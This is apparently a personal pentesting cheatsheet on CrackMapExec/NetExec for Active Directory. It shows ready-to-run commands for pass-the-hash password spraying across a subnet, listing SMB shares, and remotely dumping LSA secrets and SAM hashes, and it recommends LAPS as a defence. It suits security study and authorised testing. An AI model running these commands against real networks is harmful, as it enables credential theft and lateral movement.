```table-of-contents
title: ## Table of Contents
style: nestedList # TOC style (nestedList|nestedOrderedList|inlineFirstLevel)
minLevel: 0 # Include headings from the specified level
maxLevel: 3 # Include headings up to the specified level
includeLinks: true # Make headings clickable
debugInConsole: false # Print debug info in Obsidian console
```

## Summary
A post-exploitation tool for assessing the security of *large Active Directory networks*. CME supports a number of protocols: [[MSSQL]], [[SMB]], [[SSH]], [[WinRM]] etc (can be listed in the help section of the CLI). With this tool we can also brute force user credentials with dictionary attacks. Once we have access we can use a tool like [[Evil-Winrm]] to efficiently communicate with the winrm service.

> A community open-source version is [NetExec](https://github.com/Pennyw0rth/NetExec) which is based on the original CME by its original contributors
> https://www.netexec.wiki/

## Installation
```
sudo apt-get -y install crackmapexec
```

## Documentation
**Cheatsheet:** 
**Website:** https://web.archive.org/web/20231116172005/https://www.crackmapexec.wiki/
## Usage
```sh
crackmapexec <proto> <target-ip> -u <user or userlist> -p <pass or passlist>
```

### Password Spraying a domain using Pass-the-Hash
We can perform a password spraying attack on a set of targets to see if we are able to login to any host on a subnet. 
```sh
crackmapexec smb [target(s)] -u [user] -d . -H [hash]

# Try credentials against local administrator password on each host
crackmapexec smb 10.129.201.0/24 -u Administrator -d . -H [administrator_hash] --local-auth
```
The `--local-auth` can also be added if we want to attempt to login via local credentials on the host (eg. the local administrator password). 
> If we discover systems all using the same administrator password, we could recommend the use of the [Local Administrator Password Solution (LAPS)](https://www.microsoft.com/en-us/download/details.aspx?id=46899) which randomises the local admin password and can also rotate it on fixed intervals.

The `-x` flag can be used to execute a command too

### List SMB Shares
```sh
crackmapexec smb [ip] -u [user] -p [pass] --shares
```

### Extracting Hashes from SAM Database
**Remote dumping** of the LSA secrets & SAM databases can also be done via tools like `crackmapexec` using a local administrator account:
```sh
$ crackmapexec smb [ip] --local-auth -u [user] -p [pass] --lsa

$ crackmapexec smb [ip] --local-auth -u [user] -p [pass] --sam
```